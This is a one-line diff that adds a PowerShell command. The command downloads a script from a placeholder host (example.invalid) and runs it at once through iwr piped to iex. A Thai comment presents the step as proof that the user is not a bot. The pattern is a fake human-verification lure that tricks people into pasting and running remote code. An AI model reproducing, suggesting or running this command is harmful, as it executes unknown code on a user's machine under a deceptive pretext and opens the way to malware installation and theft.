@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # ตรวจสอบให้แน่ใจว่าคุณไม่ใช่บอท
